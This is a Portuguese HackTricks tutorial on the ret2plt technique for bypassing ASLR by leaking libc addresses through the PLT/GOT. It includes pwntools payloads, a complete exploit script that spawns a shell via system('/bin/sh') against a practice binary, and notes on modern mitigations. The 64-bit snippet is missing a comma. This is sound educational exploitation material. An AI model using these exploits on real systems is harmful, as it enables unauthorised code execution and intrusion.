# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Informações Básicas

O objetivo desta técnica seria **leak an address from a function from the PLT** para conseguir contornar o ASLR. Isto porque, por exemplo, se você leak o endereço da função `puts` da libc, você pode então **calcular onde está a base da `libc`** e calcular offsets para acessar outras funções como **`system`**.

Isto pode ser feito com um payload `pwntools` como ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Observe como **`puts`** (usando o endereço do PLT) é chamada com o endereço de `puts` localizado no GOT (Global Offset Table). Isso acontece porque, no momento em que `puts` imprime a entrada do GOT correspondente a puts, essa **entrada conterá o endereço exato de `puts` na memória**.

Observe também como o endereço de `main` é usado no exploit para que, quando `puts` terminar sua execução, o **binário chame `main` novamente em vez de sair** (então o leaked address continuará válido).

> [!CAUTION]
> Observe que, para isso funcionar, o **binário não pode ser compilado com PIE** ou você deve ter **encontrado um leak para bypassar PIE** para saber o endereço do PLT, GOT e main. Caso contrário, você precisa bypassar o PIE primeiro.

Você pode encontrar um [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Este foi o exploit final desse **exemplo**:

<details>
<summary>Exemplo completo de exploit (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Considerações modernas

- **`-fno-plt` builds** (comum em distros modernas) substituem `call foo@plt` por `call [foo@got]`. Se o binário não tiver um stub `foo@plt`, você ainda pode leakar o endereço resolvido com `puts(elf.got['foo'])` e então **retornar diretamente para a entrada GOT** (`flat(padding, elf.got['foo'])`) para pular para libc uma vez que lazy binding tenha sido concluído.
- **Full RELRO / `-Wl,-z,now`**: a GOT é somente‑leitura, mas ret2plt ainda funciona para leaks porque você apenas lê a slot da GOT. Se o símbolo nunca foi chamado, seu primeiro ret2plt também realizará lazy binding e então imprimirá o slot resolvido.
- **ASLR + PIE**: se PIE estiver habilitado, primeiro leak um ponteiro de código (por exemplo, saved return address, function pointer, ou `.plt` entry via outro format‑string/infoleak) para calcular a base do PIE, depois construa a cadeia ret2plt com os endereços PLT/GOT rebaseados.
- **Arquiteturas não‑x86 com BTI/PAC (AArch64)**: entradas do PLT são BTI landing pads válidos (`bti c`), então ao explorar binários com BTI habilitado prefira saltar para o stub do PLT (ou outro gadget anotado com BTI) em vez de ir diretamente para um gadget libc sem BTI, caso contrário a CPU levantará falhas `BRK`/`PAC`.
- **Auxiliar rápido de resolução**: se a função alvo ainda não estiver resolvida e você precisar de um leak em um só passo, encadeie a chamada PLT duas vezes: primeiro `elf.plt['foo']` (para resolver) e em seguida novamente `elf.plt['foo']` com o endereço GOT como argumento para imprimir o slot agora preenchido.

## Outros exemplos & Referências

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, o primeiro passo é preencher um overflow até o byte 0x00 do canary para então chamar puts e fazer o leak dele. Com o canary obtido cria‑se um gadget ROP para chamar puts e leakar o endereço de puts do GOT e um gadget ROP para chamar `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, stack overflow em main a partir de uma função filha. Gadget ROP para chamar puts para leakar o endereço de puts do GOT e então chamar um one gadget.

## Referências

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
